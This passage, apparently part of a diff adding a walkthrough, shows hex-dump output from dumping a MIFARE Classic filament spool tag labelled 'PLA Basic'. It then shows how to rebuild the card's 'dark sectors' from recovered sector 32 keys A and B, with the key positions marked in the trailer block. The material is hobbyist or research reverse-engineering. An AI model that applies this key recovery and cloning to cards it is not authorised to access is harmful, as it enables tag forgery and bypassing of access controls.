+[=] -----+-----+-------------------------------------------------+-----------------
+[=]    0 |   0 | 5C B4 9C A6 D2 08 04 00 04 59 92 25 BF 5F 70 90 | \........Y.%._p.
+[=]      |   1 | 41 30 30 2D 47 31 00 00 47 46 41 30 30 00 00 00 | A00-G1..GFA00...
+[=]      |   2 | 50 4C 41 00 00 00 00 00 00 00 00 00 00 00 00 00 | PLA.............
+[=]      |   3 | 86 93 FC 62 1E 12 87 87 87 69 D5 38 DE F7 B7 25 | ...b.....i.8...%
+[=]    1 |   4 | 50 4C 41 20 42 61 73 69 63 00 00 00 00 00 00 00 | PLA Basic.......
+[=]      |   5 | 00 AE 42 FF FA 00 00 00 00 00 E0 3F 00 00 00 00 | ..B........?....
+[=]      |   6 | 37 00 08 00 01 00 23 00 E6 00 BE 00 00 00 00 00 | 7.....#.........
+[=]      |   7 | 40 A2 82 C0 42 AA 87 87 87 69 F4 C0 C5 5E FC 6A | @...B....i...^.j
+[=]    2 |   8 | 88 13 88 13 E8 03 E8 03 9A 99 19 3F CD CC 4C 3E | ...........?..L>
+[=]      |   9 | 44 25 18 96 E4 F3 43 8C B1 FA 02 D0 90 25 1F 28 | D%....C......%.(
+[=]      |  10 | 00 00 00 00 E1 19 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  11 | 18 4E 3A 2E 94 CA 87 87 87 69 44 22 B9 88 91 25 | .N:......iD"...%
+[=]    3 |  12 | 32 30 32 34 5F 30 33 5F 32 32 5F 31 36 5F 32 39 | 2024_03_22_16_29
+[=]      |  13 | 32 34 5F 30 33 5F 32 32 5F 31 36 00 00 00 00 00 | 24_03_22_16.....
+[=]      |  14 | 00 00 00 00 52 00 00 00 00 00 00 00 00 00 00 00 | ....R...........
+[=]      |  15 | DD 70 6A 9E E9 51 87 87 87 69 5E 5B 37 58 85 8D | .pj..Q...i^[7X..
+[=]    4 |  16 | 02 00 01 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  17 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  18 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  19 | CD 3A 76 14 95 82 87 87 87 69 51 C3 D9 6A 06 62 | .:v......iQ..j.b
+[=]    5 |  20 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  21 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  22 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  23 | 09 1A 16 53 22 EB 87 87 87 69 67 4F 46 F0 50 25 | ...S"....igOF.P%
+[=]    6 |  24 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  25 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  26 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  27 | D0 D2 77 BC 5C 94 87 87 87 69 B4 8B A0 97 D7 B5 | ..w.\....i......
+[=]    7 |  28 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  29 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  30 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  31 | CD 9E DF D1 4D 29 87 87 87 69 8C 10 FB BE 4B CF | ....M)...i....K.
+[=]    8 |  32 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  33 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  34 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  35 | AE 46 32 3D 85 B5 87 87 87 69 92 E3 F0 E0 7B 4C | .F2=.....i....{L
+[=]    9 |  36 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  37 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  38 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  39 | 77 58 73 9E 39 B3 87 87 87 69 4F 25 2E 68 09 1E | wXs.9....iO%.h..
+[=]   10 |  40 | 01 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  41 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      |  42 | 48 5B 1C D2 A2 ED 2F 7D D9 72 3F 48 90 37 4F 81 | H[..../}.r?H.7O.
+[=]      |  43 | F8 7D 61 E3 7C F0 87 87 87 69 4D A6 DB 33 03 E0 | .}a.|....iM..3..
+[=]   11 |  44 | D6 F0 8F 4C F7 94 77 F4 EB 90 C8 92 3A F6 03 D4 | ...L..w.....:...
+[=]      |  45 | 3C 96 7E CB 19 1E EB 5E 06 2D 71 0E 60 47 95 D8 | <.~....^.-q.`G..
+[=]      |  46 | 81 69 8C AA 13 58 E9 9C 87 EB C5 5B CA FD 66 95 | .i...X.....[..f.
+[=]      |  47 | AD 44 D2 C7 B5 5C 87 87 87 69 37 35 55 80 AF 8A | .D...\...i75U...
+[=]   12 |  48 | 54 7C AF A5 8F FF 93 0D 24 B7 D7 EB 8B E1 4A 61 | T|......$.....Ja
+[=]      |  49 | 62 8B EA DF 4B 45 5D 9D B4 3A 60 BE 51 71 11 DF | b...KE]..:`.Qq..
+[=]      |  50 | 01 81 29 72 D9 60 C5 10 D2 B5 B3 B5 31 42 0F 3E | ..)r.`......1B.>
+[=]      |  51 | F9 AA 7A DA 60 0D 87 87 87 69 0A B7 8E AE 47 08 | ..z.`....i....G.
+[=]   13 |  52 | C0 F4 74 69 3D 2E ED 2C C9 81 4B CF 73 00 23 52 | ..ti=..,..K.s.#R
+[=]      |  53 | 99 B6 3F EB 52 3B 55 14 11 BE 8C 79 46 4F 8C 9D | ..?.R;U....yFO..
+[=]      |  54 | D0 DB 52 1E 8E 01 19 9F 13 31 A2 A7 42 F8 74 0D | ..R......1..B.t.
+[=]      |  55 | 97 43 55 3D 9E AD 87 87 87 69 96 94 7E AB 2A F6 | .CU=.....i..~.*.
+[=]   14 |  56 | 6A 78 3C 37 2E 4E 61 D5 BA 2E 87 A8 14 B8 D1 1F | jx<7.Na.........
+[=]      |  57 | A0 AB AB EA 66 07 0D C0 AC 3A 29 5C 2C F5 F8 79 | ....f....:)\,..y
+[=]      |  58 | 3D 71 6A 94 89 43 ED 83 79 85 03 6A 3A CF 69 E4 | =qj..C..y..j:.i.
+[=]      |  59 | AE 19 CD 0A 6E 4E 87 87 87 69 1B E1 3F F8 CD A1 | ....nN...i..?...
+[=]   15 |  60 | 2C 5E 22 D6 26 C5 FD A8 13 E3 81 29 CC BB 93 23 | ,^".&......)...#
+[=]      |  61 | 79 5B F7 3A 4F 7F 42 7E 3E D0 FC 47 88 0F 9F 94 | y[.:O.B~>..G....
+[=]      |  62 | CB 6F 8A 8E 58 40 5E A5 A9 FE EA 69 4A 2F FB 06 | .o..X@^....iJ/..
+[=]      |  63 | A1 29 32 A6 26 A7 87 87 87 69 67 15 BB D7 A5 62 | .)2.&....ig....b
+[=] -----+-----+-------------------------------------------------+-----------------
+
+[+] Saved 1024 bytes to binary file `/home/user/hf-mf-5CB49CA6-dump.bin`
+[+] Saved to json file `/home/user/hf-mf-5CB49CA6-dump.json`
+
+	NOTICE: AGAIN, NEITHER OF THE DARK SECTORS HAVE BEEN DUMPED
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~ Build the Dark Sectors from extracted data
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Sector 32 keyB = 000095dd9ecd
+Sector 32 keyA = 64966fac1571
+
+[=]   # | Dark Sectors                                    | ascii
+[=] ----+-------------------------------------------------+-----------------
+[=] 128 | A5 5A 3C C3 3C F0 00 00 00 00 00 00 00 04 08 88 | .Z<.<...........
+[=] 129 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=] 130 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=] 131 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+
+[=] 132 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=] 133 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=] 134 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=] 135 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+
+
+...Which lets us create:
+
+
+[=]   32 | 128 | A5 5A 3C C3 3C F0 00 00 00 00 00 00 00 04 08 88 | .Z<.<...........
+[=]      | 129 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      | 130 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      | 131 | 64 96 6F AC 15 71 00 F0 FF 0F 00 00 95 DD 9E CD | ................
+                 `---- Key-A ----'             `---- Key-B ----'
+
+[=]      | 132 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      | 133 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      | 134 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+[=]      | 135 | 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Tadah ... You've now got all the data
